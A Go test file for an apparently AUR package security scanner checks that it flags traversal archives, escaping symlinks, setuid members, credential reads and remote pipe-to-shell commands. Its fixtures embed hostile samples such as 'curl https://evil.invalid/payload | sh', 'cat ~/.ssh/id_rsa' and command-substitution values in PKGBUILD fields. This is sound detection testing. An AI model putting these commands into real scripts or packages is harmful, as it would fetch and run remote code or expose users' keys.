package brief

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"github.com/holgerjh/prolewatch/internal/safe"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func vendorTarBytes(t *testing.T, members map[string][]byte) []byte {
	t.Helper()
	var raw bytes.Buffer
	tw := tar.NewWriter(&raw)
	for name, body := range members {
		if err := tw.WriteHeader(&tar.Header{Name: name, Mode: 0o755, Size: int64(len(body))}); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write(body); err != nil {
			t.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	return raw.Bytes()
}

func writeRemoteSourceFixture(t *testing.T, root string, archive []byte) {
	t.Helper()
	digest := safe.SHA256Bytes(archive)
	pkgbuild := "pkgbase=demo\npkgver=1\npkgrel=1\nsource=('https://vendor.example/source.tar')\nsha256sums=('" + digest + "')\n"
	srcinfo := "pkgbase = demo\npkgver = 1\npkgrel = 1\nsource = https://vendor.example/source.tar\nsha256sums = " + digest + "\n"
	for name, body := range map[string][]byte{"PKGBUILD": []byte(pkgbuild), ".SRCINFO": []byte(srcinfo), "source.tar": archive} {
		if err := os.WriteFile(filepath.Join(root, name), body, 0o600); err != nil {
			t.Fatal(err)
		}
	}
}

func writePackageFixture(t *testing.T, root string) {
	t.Helper()
	pkg := "pkgbase=demo\npkgver=1\npkgrel=1\nsource=(local.patch)\n"
	src := "pkgbase = demo\npkgver = 1\npkgrel = 1\nsource = local.patch\n"
	for name, body := range map[string]string{"PKGBUILD": pkg, ".SRCINFO": src, "local.patch": "safe patch\n"} {
		if err := os.WriteFile(filepath.Join(root, name), []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
	}
}

func TestScannerInventoriesAndHashesWithoutFollowingLinks(t *testing.T) {
	root := t.TempDir()
	writePackageFixture(t, root)
	if err := os.Symlink("../escape", filepath.Join(root, "bad-link")); err != nil {
		t.Fatal(err)
	}
	inv, err := NewScanner(DefaultConfig()).ScanDirectory(root, "pre")
	if err != nil {
		t.Fatal(err)
	}
	if len(inv.ManifestHash) != 64 || inv.Coverage.FilesSeen != 4 {
		t.Fatalf("unexpected inventory: %+v", inv.Coverage)
	}
	ids := findingIDs(inv.Findings)
	if !ids["symlink-escape"] {
		t.Fatalf("missing escape: %#v", ids)
	}
}

func TestScannerProgressTracksFilesBytesAndArchives(t *testing.T) {
	root := t.TempDir()
	writePackageFixture(t, root)
	var raw bytes.Buffer
	tw := tar.NewWriter(&raw)
	body := []byte("safe archive member\n")
	if err := tw.WriteHeader(&tar.Header{Name: "member.txt", Mode: 0o644, Size: int64(len(body))}); err != nil {
		t.Fatal(err)
	}
	_, _ = tw.Write(body)
	_ = tw.Close()
	if err := os.WriteFile(filepath.Join(root, "source.tar"), raw.Bytes(), 0o600); err != nil {
		t.Fatal(err)
	}

	var updates []ScanProgress
	var forced int
	scanner := NewScanner(DefaultConfig())
	withProgress, err := scanner.ScanDirectoryWithProgress(root, "pre", func(progress ScanProgress, force bool) {
		updates = append(updates, progress)
		if force {
			forced++
		}
	})
	if err != nil {
		t.Fatal(err)
	}
	withoutProgress, err := scanner.ScanDirectory(root, "pre")
	if err != nil {
		t.Fatal(err)
	}
	if withProgress.ManifestHash != withoutProgress.ManifestHash || len(withProgress.Findings) != len(withoutProgress.Findings) {
		t.Fatal("progress instrumentation changed the deterministic result")
	}
	if len(updates) == 0 || forced < 2 {
		t.Fatalf("missing progress updates: count=%d forced=%d", len(updates), forced)
	}
	last := updates[len(updates)-1]
	if last.Operation != ScanOperationComplete || last.FilesSeen != withProgress.Coverage.FilesSeen ||
		last.BytesSeen != withProgress.Coverage.BytesSeen || last.ArchivesSeen != withProgress.Coverage.ArchivesSeen ||
		last.ArchiveEntries != withProgress.Coverage.ArchiveEntries ||
		last.ArchiveUnpackedBytes != withProgress.Coverage.ArchiveUnpackedBytes {
		t.Fatalf("final progress does not match coverage: %#v %+v", last, withProgress.Coverage)
	}
	archiveUpdate := false
	for _, update := range updates {
		archiveUpdate = archiveUpdate || update.Operation == ScanOperationArchiveInspection && update.ArchiveEntries > 0 && update.ArchiveUnpackedBytes > 0
	}
	if !archiveUpdate {
		t.Fatalf("archive progress was not observable: %#v", updates)
	}
}

func TestPreScanFlagsCommittedNativeBinary(t *testing.T) {
	root := t.TempDir()
	writePackageFixture(t, root)
	elf := append([]byte{0x7f, 'E', 'L', 'F', 2, 1, 1, 0}, make([]byte, 24)...)
	if err := os.WriteFile(filepath.Join(root, "payload"), elf, 0o600); err != nil {
		t.Fatal(err)
	}
	inv, err := NewScanner(DefaultConfig()).ScanDirectory(root, "pre")
	if err != nil {
		t.Fatal(err)
	}
	finding := findingByRule(inv.Findings, "repository-native-binary")
	if finding == nil || finding.HardBlock || finding.Severity != "high" {
		t.Fatalf("committed native binary was not a non-hard high finding: %#v", inv.Findings)
	}
}

func TestDeterministicOnlyDoesNotFailOnAISelectionBudget(t *testing.T) {
	root := t.TempDir()
	writePackageFixture(t, root)
	cfg := DefaultConfig()
	cfg.RetainTextForReview = false
	cfg.Limits.MaxSelectedTextBytes = 1
	inv, err := NewScanner(cfg).ScanDirectory(root, "pre")
	if err != nil {
		t.Fatal(err)
	}
	if !inv.Coverage.Complete || inv.Coverage.SelectedFiles != 0 || findingIDs(inv.Findings)["aggregate-selection-limit"] {
		t.Fatalf("AI selection budget affected deterministic-only coverage: %+v %#v", inv.Coverage, inv.Findings)
	}
}

func TestScannerPhaseExclusions(t *testing.T) {
	root := t.TempDir()
	writePackageFixture(t, root)
	if err := os.Mkdir(filepath.Join(root, "src"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "src", "generated.sh"), []byte("curl x | sh"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("/build/upstream.tar.gz", filepath.Join(root, "src", "upstream.tar.gz")); err != nil {
		t.Fatal(err)
	}
	pre, err := NewScanner(DefaultConfig()).ScanDirectory(root, "pre")
	if err != nil {
		t.Fatal(err)
	}
	if len(pre.Exclusions) != 1 || pre.Exclusions[0] != "src/" {
		t.Fatalf("unexpected exclusions: %#v", pre.Exclusions)
	}
	post, err := NewScanner(DefaultConfig()).ScanDirectory(root, "post")
	if err != nil {
		t.Fatal(err)
	}
	if ids := findingIDs(post.Findings); ids["remote-pipe-shell"] || ids["symlink-escape"] {
		t.Fatalf("default post phase interpreted vendor source content: %#v", post.Findings)
	}
	cfg := DefaultConfig()
	cfg.Vendor.ScanDepth = 1
	post, err = NewScanner(cfg).ScanDirectory(root, "post")
	if err != nil {
		t.Fatal(err)
	}
	if ids := findingIDs(post.Findings); !ids["remote-pipe-shell"] || !ids["symlink-escape"] {
		t.Fatalf("post phase did not scan vendor source at depth one: %#v", post.Findings)
	}
}

func TestVendorScanDepthControlsContentInspection(t *testing.T) {
	nested := vendorTarBytes(t, map[string][]byte{"nested.sh": []byte("curl https://evil.invalid/payload | sh\n")})
	outer := vendorTarBytes(t, map[string][]byte{
		"build.sh":   []byte("sudo true\n"),
		"nested.tar": nested,
	})
	root := t.TempDir()
	writeRemoteSourceFixture(t, root, outer)

	pre, err := NewScanner(DefaultConfig()).ScanDirectory(root, "pre")
	if err != nil {
		t.Fatal(err)
	}
	if len(pre.Exclusions) != 1 || pre.Exclusions[0] != "source.tar" || findingIDs(pre.Findings)["shell-privilege-command"] {
		t.Fatalf("pre gate inspected a cached vendor source: exclusions=%#v findings=%#v", pre.Exclusions, pre.Findings)
	}

	for _, current := range []struct {
		depth    int
		archives int
		direct   bool
		nested   bool
	}{
		{depth: 0, archives: 0},
		{depth: 1, archives: 1, direct: true},
		{depth: 2, archives: 2, direct: true, nested: true},
	} {
		cfg := DefaultConfig()
		cfg.Vendor.ScanDepth = current.depth
		inv, err := NewScanner(cfg).ScanDirectory(root, "post")
		if err != nil {
			t.Fatalf("depth %d: %v", current.depth, err)
		}
		ids := findingIDs(inv.Findings)
		if !inv.Coverage.Complete || inv.Coverage.ArchivesSeen != current.archives || ids["shell-privilege-command"] != current.direct || ids["shell-remote-pipeline"] != current.nested {
			t.Fatalf("depth %d did not enforce its boundary: coverage=%+v findings=%#v", current.depth, inv.Coverage, inv.Findings)
		}
		if len(inv.Sources) != 1 || inv.Sources[0].ObservedSHA256 != safe.SHA256Bytes(outer) || inv.Sources[0].ContentInspected != (current.depth > 0) {
			t.Fatalf("depth %d lost source provenance: %#v", current.depth, inv.Sources)
		}
		if current.depth == 0 && inv.Coverage.SelectedFiles != 2 {
			t.Fatalf("depth zero selected vendor content for AI: %+v", inv.Coverage)
		}
	}
}

func TestLocalAURControlRemainsScannedAtVendorDepthZero(t *testing.T) {
	root := t.TempDir()
	writeRemoteSourceFixture(t, root, vendorTarBytes(t, map[string][]byte{"safe.txt": []byte("safe\n")}))
	if err := os.WriteFile(filepath.Join(root, "local.patch"), []byte("curl https://evil.invalid/payload | sh\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	inv, err := NewScanner(DefaultConfig()).ScanDirectory(root, "pre")
	if err != nil {
		t.Fatal(err)
	}
	if !findingIDs(inv.Findings)["remote-pipe-shell"] {
		t.Fatalf("local AUR control escaped the pre gate: %#v", inv.Findings)
	}
}

func TestDeclaredVendorSymlinkRemainsStructuralInput(t *testing.T) {
	root := t.TempDir()
	archive := vendorTarBytes(t, map[string][]byte{"safe.txt": []byte("safe\n")})
	writeRemoteSourceFixture(t, root, archive)
	if err := os.Remove(filepath.Join(root, "source.tar")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("../../etc/passwd", filepath.Join(root, "source.tar")); err != nil {
		t.Fatal(err)
	}
	inv, err := NewScanner(DefaultConfig()).ScanDirectory(root, "pre")
	if err != nil {
		t.Fatal(err)
	}
	if !findingIDs(inv.Findings)["symlink-escape"] {
		t.Fatalf("declared source symlink bypassed structural checks: %#v", inv.Findings)
	}
}

func TestArtifactInspectionIgnoresVendorScanDepth(t *testing.T) {
	artifact := filepath.Join(t.TempDir(), "demo.pkg.tar")
	raw := vendorTarBytes(t, map[string][]byte{".INSTALL": []byte("curl https://evil.invalid/payload | sh\n")})
	if err := os.WriteFile(artifact, raw, 0o600); err != nil {
		t.Fatal(err)
	}
	cfg := DefaultConfig()
	cfg.Vendor.ScanDepth = 0
	inv, err := NewScanner(cfg).ScanArtifactsWithProgress([]string{artifact}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if inv.Coverage.ArchivesSeen != 1 || !findingIDs(inv.Findings)["shell-remote-pipeline"] {
		t.Fatalf("artifact gate inherited vendor trust: coverage=%+v findings=%#v", inv.Coverage, inv.Findings)
	}
}

func TestGeneratedPackageArchiveIsBoundThenDeferredToArtifactGate(t *testing.T) {
	root := t.TempDir()
	writePackageFixture(t, root)
	archive := vendorTarBytes(t, map[string][]byte{
		".INSTALL": []byte("curl https://evil.invalid/payload | sh\n"),
	})
	packagePath := filepath.Join(root, "demo-1-1-x86_64.pkg.tar")
	if err := os.WriteFile(packagePath, archive, 0o600); err != nil {
		t.Fatal(err)
	}

	pre, err := NewScanner(DefaultConfig()).ScanDirectory(root, "pre")
	if err != nil {
		t.Fatal(err)
	}
	if pre.Coverage.ArchivesSeen != 0 || findingIDs(pre.Findings)["remote-pipe-shell"] {
		t.Fatalf("directory gate expanded generated package output: coverage=%+v findings=%#v", pre.Coverage, pre.Findings)
	}
	bound := false
	for _, record := range pre.Files {
		if record.Path == filepath.Base(packagePath) {
			bound = record.SHA256 == safe.SHA256Bytes(archive) && record.ArchiveFormat == "tar"
		}
	}
	if !bound {
		t.Fatalf("generated package output was not hash-bound: %#v", pre.Files)
	}

	artifact, err := NewScanner(DefaultConfig()).ScanArtifactsWithProgress([]string{packagePath}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if artifact.Coverage.ArchivesSeen != 1 || !findingIDs(artifact.Findings)["remote-pipe-shell"] {
		t.Fatalf("artifact gate failed to inspect deferred package: coverage=%+v findings=%#v", artifact.Coverage, artifact.Findings)
	}
}

func TestTarTraversalIsHardBlocked(t *testing.T) {
	var raw bytes.Buffer
	gz := gzip.NewWriter(&raw)
	tw := tar.NewWriter(gz)
	body := []byte("owned")
	if err := tw.WriteHeader(&tar.Header{Name: "../../escape", Mode: 0o644, Size: int64(len(body))}); err != nil {
		t.Fatal(err)
	}
	_, _ = tw.Write(body)
	_ = tw.Close()
	_ = gz.Close()
	result := ScanArchive(bytes.NewReader(raw.Bytes()), "payload.tar.gz", DefaultConfig(), RuleEngine{}, 0)
	if !findingIDs(result.Findings)["archive-escape"] {
		t.Fatalf("missing archive escape: %#v", result.Findings)
	}
}

func TestGzipTextIsInspected(t *testing.T) {
	var raw bytes.Buffer
	gz := gzip.NewWriter(&raw)
	_, _ = gz.Write([]byte("curl https://evil.invalid/x | bash\n"))
	_ = gz.Close()
	result := ScanArchive(bytes.NewReader(raw.Bytes()), "payload.sh.gz", DefaultConfig(), RuleEngine{}, 0)
	if !findingIDs(result.Findings)["remote-pipe-shell"] {
		t.Fatalf("gzip content not scanned: %#v", result.Findings)
	}
}

func TestTopLevelSourceArchiveIsNotExcluded(t *testing.T) {
	root := t.TempDir()
	writePackageFixture(t, root)
	var raw bytes.Buffer
	gz := gzip.NewWriter(&raw)
	_, _ = gz.Write([]byte("curl https://evil.invalid/x | bash\n"))
	_ = gz.Close()
	if err := os.WriteFile(filepath.Join(root, "upstream.src.tar.gz"), raw.Bytes(), 0o600); err != nil {
		t.Fatal(err)
	}
	inv, err := NewScanner(DefaultConfig()).ScanDirectory(root, "post")
	if err != nil {
		t.Fatal(err)
	}
	if !findingIDs(inv.Findings)["remote-pipe-shell"] {
		t.Fatalf("top-level source archive was not scanned: %#v", inv.Findings)
	}
}

func TestStaticPKGBUILDScalarsResolveSimpleVariablesWithoutShell(t *testing.T) {
	values := staticPKGBUILDScalars("_pkgver=6.30\n_suffix2=07\npkgver=${_pkgver}.1.${_suffix2}\npkgrel=1 # comment\nquoted='literal value'\ndouble=\"${_pkgver} release\"\nescaped=one\\ two\npkgbase='cnrdrvcups-lb'\npkgbase+='-bin'\n")
	if values["pkgver"] != "6.30.1.07" || values["pkgrel"] != "1" || values["quoted"] != "literal value" || values["double"] != "6.30 release" || values["escaped"] != "one two" || values["pkgbase"] != "cnrdrvcups-lb-bin" {
		t.Fatalf("safe scalar expansion failed: %#v", values)
	}
	if _, ok := staticPKGBUILDScalars("pkgver=1\npkgver=$(unknown)")["pkgver"]; ok {
		t.Fatal("unsafe reassignment retained a stale known value")
	}
	for _, unsafe := range []string{
		"pkgver=$(touch /tmp/nope)",
		"pkgver=`touch /tmp/nope`",
		"pkgver=${missing:-1}",
		"pkgver=$missing",
		"pkgver=$((1+1))",
		"pkgver='unterminated",
		"pkgver=unterminated\\",
		"pkgver=one two",
		"pkgver=one;two",
		"pkgver=$9",
	} {
		if _, ok := staticPKGBUILDScalars(unsafe)["pkgver"]; ok {
			t.Fatalf("unsafe scalar syntax was evaluated: %q", unsafe)
		}
	}
}

func TestStaticPKGBUILDChecksumArraysResolveOnlyFinalLiteralValues(t *testing.T) {
	digestA := strings.Repeat("a", 64)
	digestB := strings.Repeat("b", 128)
	text := "_digest=" + digestA + "\n" +
		"sha256sums=(\n  \"${_digest}\" # first source\n)\n" +
		"_digest=" + strings.Repeat("c", 64) + "\n" +
		"sha256sums+=('SKIP')\n" +
		"sha512sums_x86_64=('" + digestB + "')\n"
	arrays := staticPKGBUILDChecksumArrays(text)
	if !equalChecksumArrays(arrays["sha256sums"], []string{digestA, "SKIP"}) || !equalChecksumArrays(arrays["sha512sums_x86_64"], []string{digestB}) {
		t.Fatalf("static checksum arrays were not resolved: %#v", arrays)
	}
	withUnusedFunction := "sha256sums=('" + digestA + "')\nmutate() { sha256sums=('" + strings.Repeat("c", 64) + "'); }\n"
	if !equalChecksumArrays(staticPKGBUILDChecksumArrays(withUnusedFunction)["sha256sums"], []string{digestA}) {
		t.Fatal("an inert function declaration invalidated a top-level checksum")
	}

	for name, unsafe := range map[string]string{
		"command substitution": "sha256sums=('" + digestA + "')\nsha256sums=(\"$(unknown)\")\n",
		"unknown variable":     "sha256sums=('" + digestA + "')\nsha256sums=(\"$missing\")\n",
		"conditional override": "sha256sums=('" + digestA + "')\nif true; then sha256sums=('" + strings.Repeat("c", 64) + "'); fi\n",
		"indexed override":     "sha256sums=('" + digestA + "')\nsha256sums[0]='" + strings.Repeat("c", 64) + "'\n",
		"conditional variable": "_digest=" + digestA + "\nif true; then _digest=" + strings.Repeat("c", 64) + "; fi\nsha256sums=(\"$_digest\")\n",
		"indirect mutation":    "sha256sums=('" + digestA + "')\neval \"sha256sums=('" + strings.Repeat("c", 64) + "')\"\n",
	} {
		t.Run(name, func(t *testing.T) {
			if _, ok := staticPKGBUILDChecksumArrays(unsafe)["sha256sums"]; ok {
				t.Fatalf("dynamic reassignment retained a stale checksum: %q", unsafe)
			}
		})
	}
}

func TestSRCINFOComparisonResolvesStaticVariables(t *testing.T) {
	inv := &Inventory{Coverage: Coverage{Complete: true}, Files: []FileRecord{
		{Path: "PKGBUILD", SelectedText: "pkgbase='cnrdrvcups-lb'\npkgbase+='-bin'\n_pkgver=6.30\n_suffix2=07\npkgver=${_pkgver}.1.${_suffix2}\npkgrel=1\n"},
		{Path: ".SRCINFO", SelectedText: "pkgbase = cnrdrvcups-lb-bin\npkgver = 6.30.1.07\npkgrel = 1\n"},
	}}
	(&Scanner{}).compareSRCINFO(inv)
	if findingByRule(inv.Findings, "srcinfo-mismatch") != nil {
		t.Fatalf("resolved equivalent metadata was reported as a mismatch: %#v", inv.Findings)
	}
	inv.Files[1].SelectedText = "pkgver = 6.30.1.08\npkgrel = 1\n"
	(&Scanner{}).compareSRCINFO(inv)
	if findingByRule(inv.Findings, "srcinfo-mismatch") == nil {
		t.Fatal("resolved metadata mismatch was not reported")
	}
}

func TestSRCINFOComparisonDetectsLiteralChecksumMismatch(t *testing.T) {
	digestA := strings.Repeat("a", 64)
	digestB := strings.Repeat("b", 64)
	makeInventory := func(pkgDigest, srcDigest string) *Inventory {
		return &Inventory{Coverage: Coverage{Complete: true}, Files: []FileRecord{
			{Path: "PKGBUILD", SelectedText: "pkgbase=demo\npkgver=1\npkgrel=1\nsource=('https://vendor.example.invalid/source.tar')\nsha256sums=('" + pkgDigest + "')\n"},
			{Path: ".SRCINFO", SelectedText: "pkgbase = demo\npkgver = 1\npkgrel = 1\nsource = https://vendor.example.invalid/source.tar\nsha256sums = " + srcDigest + "\n"},
		}}
	}

	matching := makeInventory(digestA, strings.ToUpper(digestA))
	(&Scanner{}).compareSRCINFO(matching)
	if findingByRule(matching.Findings, "srcinfo-mismatch") != nil {
		t.Fatalf("matching checksum metadata was reported: %#v", matching.Findings)
	}

	mismatched := makeInventory(digestA, digestB)
	(&Scanner{}).compareSRCINFO(mismatched)
	finding := findingByRule(mismatched.Findings, "srcinfo-mismatch")
	if finding == nil || finding.Severity != "high" || finding.Category != "package_metadata" || finding.File != ".SRCINFO" || finding.Line == nil || *finding.Line != 5 || !strings.Contains(finding.Evidence, digestA) || !strings.Contains(finding.Evidence, digestB) {
		t.Fatalf("literal checksum mismatch was not precisely reported: %#v", mismatched.Findings)
	}

	dynamic := makeInventory(digestA, digestB)
	dynamic.Files[0].SelectedText = strings.Replace(dynamic.Files[0].SelectedText, "('"+digestA+"')", "(\"$(unknown)\")", 1)
	(&Scanner{}).compareSRCINFO(dynamic)
	if findingByRule(dynamic.Findings, "srcinfo-mismatch") != nil {
		t.Fatalf("dynamic checksum array produced a guessed mismatch: %#v", dynamic.Findings)
	}
}

func TestTarSetIDIsHardBlocked(t *testing.T) {
	var raw bytes.Buffer
	tw := tar.NewWriter(&raw)
	body := []byte("#!/bin/sh\n")
	if err := tw.WriteHeader(&tar.Header{Name: "usr/bin/evil", Mode: 0o4755, Size: int64(len(body))}); err != nil {
		t.Fatal(err)
	}
	_, _ = tw.Write(body)
	_ = tw.Close()
	result := ScanArchive(bytes.NewReader(raw.Bytes()), "evil.pkg.tar", DefaultConfig(), RuleEngine{}, 0)
	if !findingIDs(result.Findings)["artifact-setid"] {
		t.Fatalf("missing set-id finding: %#v", result.Findings)
	}
}

func TestZipEscapingSymlinkIsHardBlocked(t *testing.T) {
	var raw bytes.Buffer
	zw := zip.NewWriter(&raw)
	header := &zip.FileHeader{Name: "link", Method: zip.Store}
	header.SetMode(os.ModeSymlink | 0o777)
	member, err := zw.CreateHeader(header)
	if err != nil {
		t.Fatal(err)
	}
	_, _ = member.Write([]byte("../../etc/passwd"))
	_ = zw.Close()
	result := ScanArchive(bytes.NewReader(raw.Bytes()), "evil.zip", DefaultConfig(), RuleEngine{}, 0)
	if !findingIDs(result.Findings)["archive-escape"] {
		t.Fatalf("missing zip escape: %#v", result.Findings)
	}
}

func TestNestedArchiveIsInspected(t *testing.T) {
	spool := t.TempDir()
	t.Setenv("TMPDIR", spool)
	var inner bytes.Buffer
	tw := tar.NewWriter(&inner)
	body := []byte("cat ~/.ssh/id_rsa\n")
	_ = tw.WriteHeader(&tar.Header{Name: "prepare.sh", Mode: 0o755, Size: int64(len(body))})
	_, _ = tw.Write(body)
	spec := []byte("%build\nmake\n%install\nmake install\n")
	_ = tw.WriteHeader(&tar.Header{Name: "demo.spec", Mode: 0o644, Size: int64(len(spec))})
	_, _ = tw.Write(spec)
	_ = tw.Close()
	var outer bytes.Buffer
	zw := zip.NewWriter(&outer)
	member, err := zw.Create("vendor.tar")
	if err != nil {
		t.Fatal(err)
	}
	_, _ = member.Write(inner.Bytes())
	_ = zw.Close()
	cfg := DefaultConfig()
	cfg.Limits.MaxTextPerFile = 128
	result := ScanArchive(bytes.NewReader(outer.Bytes()), "outer.zip", cfg, RuleEngine{}, 0)
	if !findingIDs(result.Findings)["credential-path"] {
		t.Fatalf("nested credential access not found: %#v", result.Findings)
	}
	if findingIDs(result.Findings)["nested-archive-limit"] || !result.Complete {
		t.Fatalf("file-backed nested archive scan was incomplete: %#v", result.Findings)
	}
	selected := map[string]bool{}
	for _, content := range result.Selected {
		selected[content.Path] = true
	}
	if !selected["outer.zip!/vendor.tar!/demo.spec"] {
		t.Fatalf("nested RPM spec was not selected for review: %#v", result.Selected)
	}
	if entries, err := os.ReadDir(spool); err != nil || len(entries) != 0 {
		t.Fatalf("nested archive spool was not removed: %#v %v", entries, err)
	}
}

func TestLargeArchiveTextIsFullyScannedLocally(t *testing.T) {
	var raw bytes.Buffer
	zw := zip.NewWriter(&raw)
	member, err := zw.Create("notes.txt")
	if err != nil {
		t.Fatal(err)
	}
	_, _ = member.Write([]byte(string(bytes.Repeat([]byte("x"), 10_000)) + "\ncurl https://evil.invalid/x | sh\n"))
	_ = zw.Close()
	cfg := DefaultConfig()
	cfg.Limits.MaxTextPerFile = 1024
	cfg.Limits.BinaryStringsBytes = 128
	result := ScanArchive(bytes.NewReader(raw.Bytes()), "source.zip", cfg, RuleEngine{}, 0)
	ids := findingIDs(result.Findings)
	if !ids["remote-pipe-shell"] || !ids["archive-member-limit"] {
		t.Fatalf("large text was not fully covered: %#v", result.Findings)
	}
}
